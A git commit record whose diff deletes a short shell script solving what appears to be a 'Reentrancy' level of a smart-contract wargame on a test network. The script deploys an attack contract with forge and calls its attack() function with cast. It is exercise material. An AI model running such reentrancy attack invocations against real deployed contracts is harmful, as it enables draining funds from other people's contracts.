16b95ac4d5593db43f8dfdf80a3b4e06dcffdab3
NME.eth <maximus.holm@gmail.com>
2022-05-04 23:39:56 +0300

    removing legacy from lvl 10

--- 10_Reentrancy/solution.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/sh
-
-# Creating our re-entrancy attack contract
-forge create --rpc-url $RINKERBY --private-key $PRIVATE_KEY src/Contract.sol:Attack --constructor-args $REENTRANCY
-
-# Calling our attack function
-cast send 0x4F2b138D6CA3570c8CDE8576887e74609291ca57 --rpc-url $RINKERBY --private-key $PRIVATE_KEY "attack()" --value 0.01ether --gas 200000
